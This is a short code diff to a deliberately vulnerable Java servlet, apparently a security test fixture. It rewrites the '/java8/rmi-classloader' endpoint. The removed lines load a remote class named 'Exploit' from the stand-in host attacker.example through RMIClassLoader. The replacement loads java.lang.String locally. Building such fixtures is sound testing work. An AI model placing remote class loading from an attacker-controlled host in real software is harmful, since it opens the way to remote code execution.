@@ -211,13 +211,9 @@ public final class Java8VulnerableServlet extends HttpServlet {
       return;
     }
     if ("/java8/rmi-classloader".equals(path)) {
-      try {
-        RMIClassLoader.loadClass("http://attacker.example/Exploit", "example.RemoteExploit");
-      } catch (ClassNotFoundException expected) {
-        send(response, "rmi classloader attempted");
-        return;
-      }
-      send(response, "rmi classloader completed");
+      Class<?> type = RMIClassLoader.loadClass(
+          "https://reports.invalid/catalog/", "java.lang.String", Java8VulnerableServlet.class.getClassLoader());
+      send(response, "local-rmi-class=" + type.getName());
       return;
     }
     if ("/java8/script".equals(path)) {
